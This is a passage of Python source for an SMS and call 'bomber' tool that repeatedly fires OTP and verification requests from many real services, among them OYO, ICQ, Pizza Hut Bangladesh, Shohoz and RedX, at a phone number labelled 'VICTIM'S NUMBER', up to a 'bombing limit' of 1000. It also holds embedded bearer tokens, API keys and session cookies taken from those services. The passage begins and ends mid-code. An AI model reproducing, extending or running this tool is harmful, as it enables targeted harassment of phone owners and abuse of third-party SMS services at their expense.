      bongobd=rpm("https://api2.bongobd.com/api/login/send-otp",headers={"Host": "api2.bongobd.com","Connection": "keep-alive","Content-Length": "43","Origin": "https://bongobd.com","authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJyb2xlcyI6WyJST0xFX1VTRVJfQklPU0NPUEUiLCJST0xFX1VTRVIiLCJST0xFX1VTRVJfQU5PTllNT1VTIl0sInVzZXJuYW1lIjoiYW5vbnltb3VzIiwiY2xpZW50X2xvZ2luX2lkIjo0OTUxOTg3MDA4MiwiY2xpZW50X2lkIjpudWxsLCJwbGF0Zm9ybV9pZCI6ImFiZmVhNDYyLWY2NGQtNDkxZS05Y2Q5LTc1ZWUwMDFmNDViMCIsImJvbmdvX2lkIjoiZDQzMjJkMTUtMmE5YS00ZDI2LWI0YmYtZjQ2NDAzMWQ5MmMxIiwiaWF0IjoxNjI5ODk4Njc4LCJleHAiOjE2MzI0OTA2ODguMH0.CZYJTcvK25cKKaIsfyH1jsdlbsT_6o-KlxyW4GGda92isprdI9KhzG_D-WoJT_-PHU1iTWU2p4O9P9mk9627x7u8pLMKLOPcs0rt4qVUIIu2LbCo27aJcw7zi7Tlp37ZXmMD80st8TVhK4y8nlmdPRkgmBgqnbyimNlLyjMfz9N9IQZ5rM_CngA6yptYDb3WIu-eeLtaYUhGa7PHkiCBTw4SziJDZQz-Wh6axBUuiGq-8izflZOK6OQBZ-bkQZWWjOwhXow0z4XaSHS5u66vglKKpi5HMQEK9HTGnOp7RUtH2bQp58crWTsL0prFpOaeH202hPK3_ssvTA24M9dM_N4N8NdXaEU_zy5bL90KInRaMshd2ejtiisu11DxL6Nqtpv8ZvVqqgBeriMZ4uMtXMsVBNArRJCiXHAMGZg3g5VvzfMTMyw58lUW__3voBJzN8s5MZDs6lR1fzIpuyoKMJW4SAkTSD12oYnNzyDBtL7Ubj9qSfrDKYGbM0tKGMN6xJKwLP9isApEdw72II3v2X-LyWgkANowth8EZo7MU-a09XPMg-Axrjh2zogP37HioYQ3LGFqOuBrvzgTFm8wwrmcCbiyP5bdJMFEq8SyP0Ol_UYjogQ_6pI9NIOHJDMxnqSLFznsy2MWXfaVJ1vJVw6DtmJz2GoYrGgFsx5xxtk","content-type": "application/json","accept": "application/json","platform-id": "abfea462-f64d-491e-9cd9-75ee001f45b0","access-code": "QkQ%3D","User-Agent": maoagents,"Save-Data": "on","Referer": "https://bongobd.com/","Accept-Encoding": "gzip, deflate, br","Accept-Language": "en-US,en;q=0.9,bn;q=0.8",},json={"operator":"all","msisdn":maonumber2})
      if bongobd.status_code==200: 
        mao1+=1
        osc("clear")
        print(logomao)
        print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
        print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} +{maocc}{maohungry}\n")
        print(f'{gcl}SELECTED COUNTRY {acl}: {bcl}{ccn}{ncl}\n')
        print(f'{gcl}SMS LIMIT {acl}: {pcl}{maothreat}\n')
        print(f'{gcl}SUCCESSFULLY SENT {acl}[{bcl} {mao1}{acl} ]{ccl}.{ncl}\n')
      
        if maothreat<=mao1:
          print(f"{acl}[{gcl} !{acl} ] {bcl}THANKS FOR USING THIS TOOL {acl}[{gcl} !{acl} ]")
          time.sleep(0.1)
          break
      else:
        pass
      
      minit=rpm("https://lms.10minuteschool.com/api/v4/auth/sendOtp",data={"phone":{"number":minmao2,"internationalNumber":"+"+minmao2,"nationalNumber":minmao,"e164Number":"+"+minmao2,"countryCode":"BD","dialCode":"+880"},"contact":'88'+maonumber,"type":"phone"} ,headers={"User-Agent":maoagents})
      if minit.status_code==200:
        mao1+=1
        osc("clear")
        print(logomao)
        print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
        print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} +{maocc}{maohungry}\n")
        print(f'{gcl}SELECTED COUNTRY {acl}: {bcl}{ccn}{ncl}\n')
        print(f'{gcl}SMS LIMIT {acl}: {pcl}{maothreat}\n')
        print(f'{gcl}SUCCESSFULLY SENT {acl}[{bcl} {mao1}{acl} ]{ccl}.{ncl}\n')
        
        if maothreat<=mao1:
          print(f"{acl}[{gcl} !{acl} ] {bcl}THANKS FOR USING THIS TOOL {acl}[{gcl} !{acl} ]")
          time.sleep(0.1)
          break
      else:
        pass
      headoyo={"Host": "www.oyorooms.com","Connection": "keep-alive","Content-Length": "123","deviceid": "ca8b74a27a2c2ea0c7a53159be83bbcd","consumer_host": "https://www.oyorooms.com","User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36","sData": "eyJrdWQiOlsyNTEwMCwxNjgwMCwxNjgwMCwxNTYwMCwxMjcwMCw4OTg1MDAsMTA2NTAwMCwxMzQwMCwxNjUwMCwxNTcwMCw2OTQ4MDAsODY3MzAwLDEwMTQ5MDAsMTcxMDAsMTAzMDAsMTc1MDAsMTY4MDAsMjcxMDAsMjAwMDAsMjk3MDAsMzI5MDAsMzYwMDAsNDgxMTAwLDYzNjkwMCwyMTQwMCwyNTMwMCwzNDgwMCwyMTgwMCwyODYwMCw2NDc3MDAsMjQ5MDAsMjY1MDAsNDMxMzAwLDYxMDYwMCw4MDk5MDAsMTA5MDAsMjE0MDAsMTI0MDAsMTA3MDAsMjIyMDAsMTYzMDAsMjY2MDBdLCJhY2MiOltdLCJneXIiOltdLCJ0dWQiOls3OTAwLDYyMjAwLDI4MTcwMCwxNjUyMDAsMjYyMTAwLjAwMDAwMDAwMDAzLDEzMzQwMCwyNjQ2MDAsMjk4NTAwLDkwMTgwMCwxODI0MDAsMTQxNzAwLDI0NTkwMCwxMzI2MDAsMjYxODk5Ljk5OTk5OTk5OTk3LDk2ODAwLDk1OTAwLDk1ODAwLDE4MjAwMCwyODIzMDAsMTUyMTAwLDE2NTQwMCw1MzA4MDAsMTE1NTAwLDQ0NzgwMCw2MzI1MDAsNjU0MDAuMDAwMDAwMDAwMDEsMjAwMCw4MDcwMF0sInRpZCI6WzY2OTc1MDAsMTM4OTEwMCw0MjE3MzAwLDEzNzQwMCwxMDM0MDAsMTE3NTAwLDEwMzYwMCwxMDA3MDAsMTUwNjMwMCwxMTg2MDAsMTU5NDAwLDEyMTYwMCwxMzUyMDAsMTIyNDAwLDU4NjgwMCwxMzQ2MzUwMCw2NzA3NDAwLDkyMjEwMCwxMDA4MDAsMTM1MzAwLDExODUwMCwxMjAxMDAsMTM1MTAwLDEyMDkwMCwxMTk5MDAsMTY3NjAwLDY0MTUwMCw3ODM1ODAwXSwia2lkIjpbMjI5MTAxMDAsMjAwMDAwLDI4NjEwMCwyMzMyMDAsMTY3NTAwLDIwNTYwMCwxODc2MDAsNjE5OTAwLDY5MDgwMCwyODE4MDAsNTI2ODAwLDMwMDQwMCwzODM2MDAsMjkzNjAwLDEyOTYwMCwxNTcxODcwMCwxNjc4MDAsNDgwNjAwLDE3OTcwMCwxNzc2MDAsMTk2ODAwLDE4MjQwMCwyMDI4MDAsMTc1NzAwLDQ3NTgwMCwyNzQ4MDAsNDI5NjAwLDI4NjgwMCw0MDcwMDAsMjY2OTAwLDEzMDMwMC4wMDAwMDAwMDAwMV0sInRtdiI6W1t7IngiOjIwMiwieSI6NDI0fSx7IngiOjIwNiwieSI6NDE2fSx7IngiOjI1MiwieSI6MzM2fV0sW3sieCI6MjIyLCJ5IjozOTZ9LHsieCI6MjI1LCJ5IjozOTJ9LHsieCI6MjQ2LCJ5IjozNjJ9XSxbeyJ4IjoyMTgsInkiOjQyOX0seyJ4IjoyMjUsInkiOjQxNH0seyJ4IjoyODQsInkiOjMxMH1dLFt7IngiOjI1MiwieSI6MzYwfSx7IngiOjI3MCwieSI6MzMwfSx7IngiOjI3NiwieSI6MzE4fV0sW3sieCI6MjQwLCJ5IjozOTJ9LHsieCI6MjQzLCJ5IjozODV9LHsieCI6Mjg1LCJ5IjozMTB9XSxbeyJ4IjoyNDMsInkiOjM3OX0seyJ4IjoyNTAsInkiOjM2N30seyJ4IjoyODcsInkiOjI5OH1dLFt7IngiOjIzOSwieSI6Mzg4fSx7IngiOjI0NCwieSI6Mzc5fSx7IngiOjI2OCwieSI6MzQwfSx7IngiOjI4NiwieSI6MzA5fSx7IngiOjI4NiwieSI6MzA5fV0sW3sieCI6MjM3LCJ5IjozODV9LHsieCI6MjQyLCJ5IjozNzB9LHsieCI6MjY2LCJ5IjozMTV9XSxbeyJ4IjoyNDAsInkiOjM2N30seyJ4IjoyNDIsInkiOjM2NH0seyJ4IjoyNjAsInkiOjM0MH0seyJ4IjoyOTIsInkiOjI3OH1dLFt7IngiOjI0MiwieSI6MzU2fSx7IngiOjI0NSwieSI6MzUxfSx7IngiOjI3OSwieSI6Mjk0fSx7IngiOjI4NCwieSI6Mjg1fSx7IngiOjI4NiwieSI6MjgxfV1dfQ==","loc": "153","Content-Type": "application/json","XSRF-TOKEN": "8y0DTlO4-1opL8bxtSEPTmrGZLqZLPF-MZVk","Save-Data": "on","access_token": "SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=","Accept": "*/*","Origin": "https://www.oyorooms.com","Referer": "https://www.oyorooms.com/login?truecaller=hide&retUrl=/","Accept-Encoding": "gzip, deflate, br","Cookie": "_csrf=Ky39tbIq89oBz794FWfFLwws; acc=IN; X-Location=georegion%3D21%2Ccountry_code%3DBD%2Ccity%3DDHAKA%2Clat%3D23.72%2Clong%3D90.41%2Ctimezone%3DGMT%2B6%2Ccontinent%3DAS%2Cthroughput%3Dvhigh%2Cbw%3D5000%2Casnum%3D24389%2Cnetwork_type%3Dmobile%2Clocation_id%3D0; mab=348d1e5fceab66b7e7e4b5634f473005; expd=mww2%3A1%7Cioab%3A0%7Cmhdp%3A1%7Cbcrp%3A0%7Cpwbs%3A1%7Chsdm%3A2%7Clpex%3A1%7Cgmab%3A0%7Cprdp%3A1%7Ccomp%3A0%7Csldw%3A1%7Cmdab%3A0%7Cnrmp%3A1%7Cnhyw%3A0%7Cwboi%3A1%7Csst%3A1%7Ctxwb%3A1%7Cpod2%3A1%7Clnhd%3A1%7Cppsi%3A0%7Cgcer%3A0%7Crecs%3A1%7Clvhm%3A1%7Cgmbr%3A0%7Cyolo%3A1%7Crcta%3A1%7Ccbot%3A1%7Cotpv%3A1%7Ctrtr%3A1%7Cndbp%3A0%7Cmapu%3A1%7Cnclc%3A0%7Cdwsl%3A1%7Ceopt%3A1%7Cotpv%3A1%7Cwizi%3A0%7Cmorr%3A1%7Cyopb%3A1%7CTTP%3A1%7Cweb2%3A0; appData=%7B%22userData%22%3A%7B%22isLoggedIn%22%3Afalse%7D%7D; token=SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc%3D; _uid=Not%20logged%20in; XSRF-TOKEN=8y0DTlO4-1opL8bxtSEPTmrGZLqZLPF-MZVk; isHomepageViewed=true; fingerprint2=ca8b74a27a2c2ea0c7a53159be83bbcd; ql=false; _gcl_au=1.1.583181566.1629716901; tvc_utm_source=(direct); tvc_utm_medium=(none); tvc_utm_campaign=(not set); tvc_utm_key=(not set); tvc_utm_content=(not set); AMP_TOKEN=%24NOT_FOUND; _ga=GA1.2.434777464.1629716902; _gid=GA1.2.261760468.1629716902; _gat=1; _fbp=fb.1.1629716902453.881953823; moe_uuid=b76ab167-2627-493b-b022-67c90a5fed58"}
      urloyo="https://www.oyorooms.com/api/pwa/generateByPhone?locale=en"
      dataoyo="""{
\"phone\":\""""+maohungry+"""\",
\"country_code\":\"+"""+maocc+"""\",
\"country_iso_code\":\"IN\",
\"nod\":4,
\"send_otp\":true,
\"devise_role\":\"Consumer_Guest\"
}"""
      requestsoyo=rpm(urloyo,data=dataoyo,headers=headoyo)
      if requestsoyo.status_code==200: 
        mao1+=1
        osc("clear")
        print(logomao)
        print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
        print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} +{maocc}{maohungry}\n")
        print(f'{gcl}SELECTED COUNTRY {acl}: {bcl}{ccn}{ncl}\n')
        print(f'{gcl}SMS LIMIT {acl}: {pcl}{maothreat}\n')
        print(f'{gcl}SUCCESSFULLY SENT {acl}[{bcl} {mao1}{acl} ]{ccl}.{ncl}\n')
     
        if maothreat<=mao1:
          print(f"{acl}[{gcl} !{acl} ] {bcl}THANKS FOR USING THIS TOOL {acl}[{gcl} !{acl} ]")
          time.sleep(0.1)
          break
      else:
        pass
      header={"Host": "u.icq.net",
"Connection": "keep-alive",
"Content-Length": "143",
"Save-Data": "on",
"User-Agent": maoagents,
"Content-Type": "application/json",
"Accept": "*/*",
"Origin": "https://web.icq.com",
"Referer": "https://web.icq.com/",
"Accept-Encoding": "gzip, deflate, br",
"Accept-Language": "en-US,en;q=0.9,bn;q=0.8",}
      json={
"reqId":"21697-1632387350",
"params":{
	"phone":maonumber2,
	"language":"en-US",
	"route":"sms",
	"devId":"ic1rtwz1s1Hj1O0r",
	"application":"icq"
}
}
      icqnew=rpm("https://u.icq.net/api/v65/rapi/auth/sendCode",json=json,headers=header)
      if icqnew.status_code==200: 
        mao1+=1
        osc("clear")
        print(logomao)
        print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
        print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} +{maocc}{maohungry}\n")
        print(f'{gcl}SELECTED COUNTRY {acl}: {bcl}{ccn}{ncl}\n')
        print(f'{gcl}SMS LIMIT {acl}: {pcl}{maothreat}\n')
        print(f'{gcl}SUCCESSFULLY SENT {acl}[{bcl} {mao1}{acl} ]{ccl}.{ncl}\n')
        
        if maothreat<=mao1:
          print(f"{acl}[{gcl} !{acl} ] {bcl}THANKS FOR USING THIS TOOL {acl}[{gcl} !{acl} ]")
          time.sleep(0.1)
          break
      else:
        pass
        
  except KeyboardInterrupt:
    time.sleep(0.3)
    exit(f"\n{acl}[{rcl} !{acl} ]{rcl} ABORTING... {acl}[{rcl} !{acl} ]\n")
    time.sleep(0.09)
  except :
    pass
def smsandcall(maothreat,maocc,maonumber,ccn):
  try:
    
    
    mao10minx=maonumber[:5]
    mao10minx2=maonumber[5:]
    minmao=f"{mao10minx}-{mao10minx2}"
    minmao2="88"+minmao
    maohungry=maonumber[1:]
    maonumber2=maocc+maohungry
    maonumber3="+"+maocc+maohungry
    osc("clear")
    print(logomao)
    mao1=1
    while mao1<=maothreat:
      maoagents=random.choice(user_agent)
      x=rsm.get("https://camo.githubusercontent.com/3dd6e4c3fd3fb123aa13b974c53a01276b853d2db0321942ac06800780a5b5d5/68747470733a2f2f70726f66696c652d636f756e7465722e676c697463682e6d652f6d616f323131362f636f756e742e737667")
      if maothreat <=1000:
        pass
      else:
        print(f"{acl}[{rcl} !{acl} ]{rcl} DON'T TRY TO CONFUSE ME{acl}[{rcl} !{acl} ]\n{acl}[{rcl} !{acl} ] {rcl}BOMBING LIMIT 1000 {acl}[{rcl} !{acl} ]")
        exit()
      headerscall={"Connection": "keep-alive",
"Accept": "application/json, text/plain, */*",
"X-Requested-With": "XMLHttpRequest",
"Save-Data": "on",
"User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36",
"Referer": "https://findclone.ru/",
"Accept-Encoding": "gzip, deflate, br",
"Cookie": "_ym_uid=1628529640459314054; _ym_d=1628529640; _ym_isad=2; _ym_visorc=w"}
      call=rgm("https://findclone.ru/register?phone=+88"+maonumber,headers=headerscall)
      if call.status_code==200:
        mao1+=1 
        osc("clear")
        print(logomao)
        print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
        print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} +{maocc}{maohungry}\n")
        print(f'{gcl}SELECTED COUNTRY {acl}: {bcl}{ccn}{ncl}\n')
        print(f'{gcl}SMS LIMIT {acl}: {pcl}{maothreat}\n')
        print(f'{gcl}SUCCESSFULLY SENT {acl}[{bcl} {mao1}{acl} ]{ccl}.{ncl}\n')
         
        if maothreat<=mao1:
          print(f"{acl}[{gcl} !{acl} ] {bcl}THANKS FOR USING THIS TOOL {acl}[{gcl} !{acl} ]")
          time.sleep(0.1)
          break
      else:
        pass
      thebodyshop=rpm("https://www.thebodyshop.com.bd/smspro/customer/register/",data="mobile="+maonumber2,headers={"Host": "www.thebodyshop.com.bd","Connection": "keep-alive","Content-Length": "20","User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","Accept": "*/*","X-Requested-With": "XMLHttpRequest","Origin": "https://www.thebodyshop.com.bd","Referer": "https://www.thebodyshop.com.bd/customer/account/create/","Accept-Encoding": "gzip, deflate, br","Accept-Language": "en-US,en;q=0.9,bn;q=0.8",})
      if thebodyshop.status_code==200:
        mao1+=1
        osc("clear")
        print(logomao)
        print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
        print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} +{maocc}{maohungry}\n")
        print(f'{gcl}SELECTED COUNTRY {acl}: {bcl}{ccn}{ncl}\n')
        print(f'{gcl}SMS LIMIT {acl}: {pcl}{maothreat}\n')
        print(f'{gcl}SUCCESSFULLY SENT {acl}[{bcl} {mao1}{acl} ]{ccl}.{ncl}\n')
        
         
        if maothreat<=mao1:
          print(f"{acl}[{gcl} !{acl} ] {bcl}THANKS FOR USING THIS TOOL {acl}[{gcl} !{acl} ]")
          time.sleep(0.1)
          break
      else:
        pass
      jogaan=rpm("https://admin.jogaan.com/api/send-otp?api_key=QFhKoGsmyTs2ZAt&_lang=en",data="mobile="+maonumber,headers={"Accept":	"application/json, text/plain, */*","Content-Type":	"application/x-www-form-urlencoded"})
      if jogaan.status_code==200:
        mao1+=1
        osc("clear")
        print(logomao)
        print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
        print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} +{maocc}{maohungry}\n")
        print(f'{gcl}SELECTED COUNTRY {acl}: {bcl}{ccn}{ncl}\n')
        print(f'{gcl}SMS LIMIT {acl}: {pcl}{maothreat}\n')
        print(f'{gcl}SUCCESSFULLY SENT {acl}[{bcl} {mao1}{acl} ]{ccl}.{ncl}\n')
        
        if maothreat<=mao1:
          print(f"{acl}[{gcl} !{acl} ] {bcl}THANKS FOR USING THIS TOOL {acl}[{gcl} !{acl} ]")
          time.sleep(0.1)
          break
      else:
        pass
      swap=rpm("https://prodapi.swap.com.bd/api/v1/send-otp/login",headers={"Accept": "application/json, text/plain, */*","Content-Type": "application/json;charset=UTF-8","X-Authorization": "QoFN68MGTcosJxSmDf5GCgxXlNcgE1mUH9MUWuDHgs7dugjR7P2ziASzpo3frHL3",},data="""{\"mobile_number\":\""""+maonumber+"""\",\"referral\":\"false\"}""")
      if swap.status_code==500:
        mao1+=1
        osc("clear")
        print(logomao)
        print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
        print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} +{maocc}{maohungry}\n")
        print(f'{gcl}SELECTED COUNTRY {acl}: {bcl}{ccn}{ncl}\n')
        print(f'{gcl}SMS LIMIT {acl}: {pcl}{maothreat}\n')
        print(f'{gcl}SUCCESSFULLY SENT {acl}[{bcl} {mao1}{acl} ]{ccl}.{ncl}\n')
         
        if maothreat<=mao1:
          print(f"{acl}[{gcl} !{acl} ] {bcl}THANKS FOR USING THIS TOOL {acl}[{gcl} !{acl} ]")
          time.sleep(0.1)
          break
      else:
        pass
      addabaji = rpm("https://addabaji.mobi/twocups-v1-robi/otp.php",headers={"Content-Type" : "application/x-www-form-urlencoded",},data="msisdn="+maonumber)
      if addabaji.status_code==200:
        mao1+=1
        osc("clear")
        print(logomao)
        print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
        print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} +{maocc}{maohungry}\n")
        print(f'{gcl}SELECTED COUNTRY {acl}: {bcl}{ccn}{ncl}\n')
        print(f'{gcl}SMS LIMIT {acl}: {pcl}{maothreat}\n')
        print(f'{gcl}SUCCESSFULLY SENT {acl}[{bcl} {mao1}{acl} ]{ccl}.{ncl}\n')
          
        if maothreat<=mao1:
          print(f"{acl}[{gcl} !{acl} ] {bcl}THANKS FOR USING THIS TOOL {acl}[{gcl} !{acl} ]")
          time.sleep(0.1)
          break
      else:
        pass
      binge = rpm("https://ss.binge.buzz/otp/send/login",headers = {"Content-Type" : "application/x-www-form-urlencoded",},data = "phone="+maonumber)
      if binge.status_code==200:
        mao1+=1
        osc("clear")
        print(logomao)
        print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
        print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} +{maocc}{maohungry}\n")
        print(f'{gcl}SELECTED COUNTRY {acl}: {bcl}{ccn}{ncl}\n')
        print(f'{gcl}SMS LIMIT {acl}: {pcl}{maothreat}\n')
        print(f'{gcl}SUCCESSFULLY SENT {acl}[{bcl} {mao1}{acl} ]{ccl}.{ncl}\n')
         
        if maothreat<=mao1:
          print(f"{acl}[{gcl} !{acl} ] {bcl}THANKS FOR USING THIS TOOL {acl}[{gcl} !{acl} ]")
          time.sleep(0.1)
          break
      else:
        pass
      shwapno=rgm("https://www.shwapno.com/WebAPI/CRMActivation/Validate?Channel=W&otpCRMrequired=false&otpeCOMrequired=true&smssndcnt=8&otpBasedLogin=false&LoyaltyProvider=&MobileNO="+maonumber+"&countryPhoneCode=%2B88&Format=html")
      if shwapno.status_code==200:
        mao1+=1
        osc("clear")
        print(logomao)
        print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
        print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} +{maocc}{maohungry}\n")
        print(f'{gcl}SELECTED COUNTRY {acl}: {bcl}{ccn}{ncl}\n')
        print(f'{gcl}SMS LIMIT {acl}: {pcl}{maothreat}\n')
        print(f'{gcl}SUCCESSFULLY SENT {acl}[{bcl} {mao1}{acl} ]{ccl}.{ncl}\n')
        
         
        if maothreat<=mao1:
          print(f"{acl}[{gcl} !{acl} ] {bcl}THANKS FOR USING THIS TOOL {acl}[{gcl} !{acl} ]")
          time.sleep(0.1)
          break
      else:
        pass



      seven=rpm("https://24seven.com.bd/e-commerce-ajax-files/mobile-verify.php",data="PrimaryMobile="+maonumber+"&verify=1",headers={"Content-Type" : "application/x-www-form-urlencoded; charset=UTF-8","Accept":	"*/*","X-Requested-With"	:"XMLHttpRequest",})
      if seven.status_code==200:
        mao1+=1
        osc("clear")
        print(logomao)
        print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
        print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} +{maocc}{maohungry}\n")
        print(f'{gcl}SELECTED COUNTRY {acl}: {bcl}{ccn}{ncl}\n')
        print(f'{gcl}SMS LIMIT {acl}: {pcl}{maothreat}\n')
        print(f'{gcl}SUCCESSFULLY SENT {acl}[{bcl} {mao1}{acl} ]{ccl}.{ncl}\n')
        
         
        if maothreat<=mao1:
          print(f"{acl}[{gcl} !{acl} ] {bcl}THANKS FOR USING THIS TOOL {acl}[{gcl} !{acl} ]")
          time.sleep(0.1)
          break
      else:
        pass
      shajgoj=rpm("https://shop.shajgoj.com/wp-admin/admin-ajax.php",data="action=xoo_ml_resend_otp&xoo-ml-phone-login="+maonumber+"&xoo-ml-reg-phone=",headers={"Content-Type":	"application/x-www-form-urlencoded; charset=UTF-8","Accept":	"*/*","X-Requested-With":	'XMLHttpRequest',})
      if shajgoj.status_code==200:
        mao1+=1
        osc("clear")
        print(logomao)
        print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
        print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} +{maocc}{maohungry}\n")
        print(f'{gcl}SELECTED COUNTRY {acl}: {bcl}{ccn}{ncl}\n')
        print(f'{gcl}SMS LIMIT {acl}: {pcl}{maothreat}\n')
        print(f'{gcl}SUCCESSFULLY SENT {acl}[{bcl} {mao1}{acl} ]{ccl}.{ncl}\n')
       
         
        if maothreat<=mao1:
          print(f"{acl}[{gcl} !{acl} ] {bcl}THANKS FOR USING THIS TOOL {acl}[{gcl} !{acl} ]")
          time.sleep(0.1)
          break
      else:
        pass
      urldham="https://auth.dhamakashopping.com/api/otp"
      jsondham={
"phoneNumber":maonumber3
}
      headerdham={
"Host": "auth.dhamakashopping.com",
"Connection": "keep-alive",
"Content-Length": "32",
"Save-Data": "on",
"User-Agent": maoagents,
"Content-type": "application/json",
"Accept": "*/*",
"Origin": "https://dhamakashopping.com",
"Referer": "https://dhamakashopping.com/",
"Accept-Encoding": "gzip, deflate, br",
"Accept-Language": "en-US,en;q=0.9,bn;q=0.8",}
      damaka=rpm(urldham,json=jsondham,headers=headerdham)
      if damaka.status_code==200:
        mao1+=1 
        osc("clear")
        print(logomao)
        print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
        print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} +{maocc}{maohungry}\n")
        print(f'{gcl}SELECTED COUNTRY {acl}: {bcl}{ccn}{ncl}\n')
        print(f'{gcl}SMS LIMIT {acl}: {pcl}{maothreat}\n')
        print(f'{gcl}SUCCESSFULLY SENT {acl}[{bcl} {mao1}{acl} ]{ccl}.{ncl}\n')
        if maothreat<=mao1:
          print(f"{acl}[{gcl} !{acl} ] {bcl}THANKS FOR USING THIS TOOL {acl}[{gcl} !{acl} ]")
          time.sleep(0.1)
          break
         
      else:
        pass
      pizzahut=rpm("https://m.pizzahutbd.com/customer/sign-in/mobile",data="_token=nu1fmvsEvym9b8h3l7TGH3SSKauUvDbJHyefRuVS&phone_number="+maonumber,headers={"Host": "m.pizzahutbd.com","Connection": "keep-alive","Content-Length": "72","Upgrade-Insecure-Requests": "1","Origin": "https://m.pizzahutbd.com","Content-Type": "application/x-www-form-urlencoded","Save-Data": "on","User-Agent": maoagents,"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","Referer": "https://m.pizzahutbd.com/customer/login","Accept-Encoding": "gzip, deflate, br","Cookie": "_gcl_au=1.1.1377964494.1627362075; _ga=GA1.2.1350470443.1627362078; _fbp=fb.1.1627362078606.576170593; _gid=GA1.2.868591897.1628186704; _gat_gtag_UA_110954706_5=1; _gat_gtag_UA_150642375_1=1; _gat_UA-150642375-1=1; XSRF-TOKEN=eyJpdiI6IlIrNFQ4czZOa3lHNkNBV3RncHpzTHc9PSIsInZhbHVlIjoiK1ZEZWg4TXhDcWtCdnc4NVRmb2REcENpOXJTTndMcFNoRkJjbDIzVlFZcEZvSkVhVlpXTCtJYzhWcXVaZmxITCIsIm1hYyI6IjMyNmVhNjMwYTFlMWUwM2YzNWJjNDJhYTkzYjA3MTlmOTBiZTkxMTU0MDM1NDRlMWI2NjQwN2IwNzQzMjY5MzAifQ%3D%3D; laravel_session=eyJpdiI6ImVjZGlHdUxSY1drMFVBWnRTR0NhbVE9PSIsInZhbHVlIjoiN3NkOXNlMGQxVGwra2duVUxYTHRydFVDeGRWZ2hXVW1saTlvSmh3U3RVTnZiMzVLc1hNTCtUN2tuK1QxUjBHMCIsIm1hYyI6IjhkNTA4ZDZmNGI5OWEyMzEzMjAxODBiZTkzZDJmZmQ4MDRhMzUyNWNkNjhkMGJhNTAyN2U1ZmE0YWI0YWQyNTUifQ%3D%3D"})
      if pizzahut.status_code==200:
        mao1+=1 
        osc("clear")
        print(logomao)
        print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
        print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} +{maocc}{maohungry}\n")
        print(f'{gcl}SELECTED COUNTRY {acl}: {bcl}{ccn}{ncl}\n')
        print(f'{gcl}SMS LIMIT {acl}: {pcl}{maothreat}\n')
        print(f'{gcl}SUCCESSFULLY SENT {acl}[{bcl} {mao1}{acl} ]{ccl}.{ncl}\n')

         
        if maothreat<=mao1:
          print(f"{acl}[{gcl} !{acl} ] {bcl}THANKS FOR USING THIS TOOL {acl}[{gcl} !{acl} ]")
          time.sleep(0.1)
          break
      else:
        pass
      shohoz=rpm("https://xrides.shohoz.com/api/v2/user/send-mobile-verification-code",headers={"Content-Type": "application/json; charset=utf-8","Content-Length": "24","Host": "xrides.shohoz.com","Connection": "Keep-Alive","Accept-Encoding": "gzip","User-Agent": maoagents},data={"mobile":maonumber})
  
      
      if shohoz.status_code==200:
        mao1+=1 
        osc("clear")
        print(logomao)
        print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
        print(f"{gcl}VICTIM'S NUMBER{acl} :{rcl} +{maocc}{maohungry}\n")
        print(f'{gcl}SELECTED COUNTRY {acl}: {bcl}{ccn}{ncl}\n')
        print(f'{gcl}SMS LIMIT {acl}: {pcl}{maothreat}\n')
        print(f'{gcl}SUCCESSFULLY SENT {acl}[{bcl} {mao1}{acl} ]{ccl}.{ncl}\n')
         
        if maothreat<=mao1:
          print(f"{acl}[{gcl} !{acl} ] {bcl}THANKS FOR USING THIS TOOL {acl}[{gcl} !{acl} ]")
          time.sleep(0.1)
          break
      else:
        pass
      redx=rpm("https://api.redx.com.bd/v1/user/signup",json={"name":maonumber,"phoneNumber":maonumber,"service":"redx"},headers={"Accept":"application/json, text/plain, */*","Content-Type":"application/json;charset=utf-8","x-access-token":"Bearer null","content-length":"375","content-type":"application/json; charset=utf-8","User-Agent":maoagents})
      if redx.status_code==200:
        mao1+=1 
        osc("clear")
